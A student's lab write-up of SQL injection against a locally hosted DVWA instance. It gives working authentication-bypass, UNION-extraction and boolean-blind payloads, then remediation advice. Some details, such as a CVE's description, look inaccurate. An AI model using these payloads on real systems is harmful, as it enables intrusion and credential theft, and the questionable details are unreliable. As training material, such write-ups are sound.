# Task 3 — SQL Injection on DVWA (Low Security)

**AICTE Oasis Infobyte Security Analyst Internship · June 2026**  
**Author:** Richard Boakye Danquah · Kumasi, Ghana 🇬🇭

---

## Objective

Demonstrate a **SQL Injection (SQLi)** vulnerability against **DVWA (Damn Vulnerable Web Application)** running at **Low security**. Three injection techniques are covered:

| # | Technique | Goal |
|---|-----------|------|
| 1 | Authentication Bypass | Log in without valid credentials |
| 2 | UNION-Based Extraction | Dump usernames and password hashes |
| 3 | Boolean-Blind Inference | Confirm vulnerability without visible output |

---

## ⚠️ Legal Disclaimer

> This project is **for educational purposes only**.  
> All testing was performed against a **locally hosted DVWA instance** on an isolated VM.  
> Never run SQLi attacks against systems you do not own or have explicit written permission to test.  
> Unauthorized SQL injection is a criminal offence under the **Computer Misuse Act** and equivalent laws worldwide.

---

## Tools & Environment

| Tool | Version | Purpose |
|------|---------|---------|
| DVWA | 1.10 / 2.x | Deliberately vulnerable web app target |
| Apache2 | 2.4.x | Local web server |
| MySQL / MariaDB | 5.7+ | Backend database |
| curl | 7.x | HTTP request crafting in script |
| sqlmap | 1.7+ | Automated SQLi scanner (optional) |
| Ubuntu Linux | 22.04 | Host OS for DVWA |

---

## Files in This Repository

```
task3-sqli/
├── sql_injection_exploit.sh   # Automated exploit/demo script
├── screenshots/
│   ├── 01_dvwa_login_page.png         # DVWA login before attack
│   ├── 02_auth_bypass_payload.png     # Payload entered in form
│   ├── 03_auth_bypass_success.png     # Logged in without password
│   ├── 04_sqli_page_normal.png        # Normal DVWA SQLi page (id=1)
│   ├── 05_union_columns.png           # Column count with ORDER BY
│   ├── 06_union_db_info.png           # Database/user extracted
│   ├── 07_union_users_table.png       # Table names extracted
│   ├── 08_password_hashes.png         # user + password hash dump
│   ├── 09_boolean_true.png            # AND 1=1 response
│   ├── 10_boolean_false.png           # AND 1=2 response
│   └── 11_sqlmap_output.png           # sqlmap automated scan
└── README.md                          # This file
```

---

## Setup & Execution

### 1. Install & Start DVWA

```bash
# Install dependencies
sudo apt-get update
sudo apt-get install -y apache2 mysql-server php php-mysql git

# Clone DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git dvwa

# Configure database
sudo cp dvwa/config/config.inc.php.dist dvwa/config/config.inc.php
# Edit config: set db_password to your MySQL root password

# Set permissions
sudo chown -R www-data:www-data /var/www/html/dvwa

# Start services
sudo service apache2 start
sudo service mysql start

# Browse to http://127.0.0.1/dvwa/setup.php → Click "Create / Reset Database"
```

### 2. Set Security Level to LOW

1. Log in at `http://127.0.0.1/dvwa/login.php` (admin / password)
2. Navigate to **DVWA Security** in the left menu
3. Set level to **Low** → Click **Submit**

### 3. Run the Exploit Script

```bash
# Clone the repo
git clone https://github.com/bric6755-netizen/OIBSIP.git
cd OIBSIP/task3-sqli

# Make executable
chmod +x sql_injection_exploit.sh

# Run (DVWA must already be running)
./sql_injection_exploit.sh
```

---

## Attack Walkthrough

### Technique 1 — Authentication Bypass

**Target:** `http://127.0.0.1/dvwa/login.php`

**Vulnerable PHP code (Low security):**
```php
$query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
```

**Payload:**
```
Username:  ' OR '1'='1'--
Password:  (anything)
```

**Resulting SQL query:**
```sql
SELECT * FROM `users` WHERE user = '' OR '1'='1'-- AND password = 'x';
```

**Why it works:**  
The `OR '1'='1'` clause is always `TRUE`, so the `WHERE` condition succeeds for every row. The `--` comments out the rest of the query including the password check. MySQL returns the first user record (admin), and the app logs you in.

---

### Technique 2 — UNION-Based Data Extraction

**Target:** `http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=INPUT&Submit=Submit`

**Vulnerable PHP code (Low security):**
```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

#### Step 2a — Determine column count
```
Payload: 1' ORDER BY 1-- 
Payload: 1' ORDER BY 2-- 
Payload: 1' ORDER BY 3--   ← error here → query has exactly 2 columns
```

#### Step 2b — Confirm injectable columns
```
Payload: 1' UNION SELECT null, null-- 
```

#### Step 2c — Extract database metadata
```
Payload: 1' UNION SELECT user(), database()-- 
Output:  First name: root@localhost  |  Surname: dvwa
```

#### Step 2d — List tables
```
Payload: 1' UNION SELECT table_name, table_schema
         FROM information_schema.tables
         WHERE table_schema = database()-- 
Output:  guestbook, users
```

#### Step 2e — Dump credentials
```
Payload: 1' UNION SELECT user, password FROM users-- 
Output:
  admin     | 5f4dcc3b5aa765d61d8327deb882cf99  (= "password" in MD5)
  gordonb   | e99a18c428cb38d5f260853678922e03  (= "abc123")
  1337      | 8d3533d75ae2c3966d7e0d4fcc69216b  (= "charley")
  pablo     | 0d107d09f5bbe40cade3de5c71e9e9b7  (= "letmein")
  smithy    | 5f4dcc3b5aa765d61d8327deb882cf99  (= "password")
```

> Hashes cracked with online tools (MD5 rainbow tables) to demonstrate weak hashing.

---

### Technique 3 — Boolean-Blind Inference

Used when the page doesn't display data but behaves differently on true/false conditions.

```
TRUE  payload: 1' AND 1=1-- 
FALSE payload: 1' AND 1=2-- 
```

If the page content/length differs between the two responses → **blind SQLi confirmed**.

---

## CVE Context

| CVE | Description | Relevance |
|-----|-------------|-----------|
| CVE-2023-23752 | Joomla! unauthenticated SQLi | Same class: unsanitised GET parameter |
| CVE-2022-32548 | DrayTek router SQLi RCE | Auth bypass → full takeover |
| CVE-2019-19781 | Citrix NetScaler path traversal | SQLi often chains with traversal |
| OWASP A03:2021 | Injection — #3 in OWASP Top 10 | Industry-standard classification |

---

## Remediation

### 1. Prepared Statements (Primary Fix)

```php
// VULNERABLE (Low security):
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

// SECURE (PDO prepared statement):
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = ?');
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

### 2. Input Validation

```php
// Validate that id is a positive integer
if (!is_numeric($id) || (int)$id <= 0) {
    die("Invalid input.");
}
```

### 3. Principle of Least Privilege

```sql
-- Web app DB user should only SELECT from specific tables
CREATE USER 'dvwa_app'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT ON dvwa.users TO 'dvwa_app'@'localhost';
-- No GRANT, DROP, or access to information_schema
```

### 4. Error Handling

```php
// Never expose MySQL errors:
// BAD:  die(mysql_error());
// GOOD: log internally, return generic message
error_log($e->getMessage());
die("An error occurred. Please try again.");
```

### 5. Web Application Firewall

Deploy **ModSecurity** with the **OWASP Core Rule Set (CRS)** to detect and block common SQLi patterns in transit.

---

## Comparing DVWA Security Levels

| Level | Mitigation | Still Vulnerable? |
|-------|-----------|-------------------|
| Low | None — raw string interpolation | ✅ Yes — fully exploitable |
| Medium | `mysql_real_escape_string()` | ⚠️ Partial — numeric bypass possible |
| High | PDO prepared statements | ❌ No — properly mitigated |
| Impossible | PDO + strict type checking + token | ❌ No |

---

## Takeaways

- SQL injection remains the **#3 vulnerability** in the OWASP Top 10 (A03:2021) despite being a known issue since the 1990s
- A single unparameterised query can expose **an entire database** including credentials, PII, and session tokens
- **Prepared statements** are the correct fix — escaping alone is insufficient
- MD5 password hashing without salting allows **instant rainbow-table cracking**

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [sqlmap Documentation](https://sqlmap.org/)
- [NIST CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [PDO Prepared Statements — PHP Docs](https://www.php.net/manual/en/pdo.prepared-statements.php)

---

*Part of the AICTE Oasis Infobyte Security Analyst Internship — Task 3*

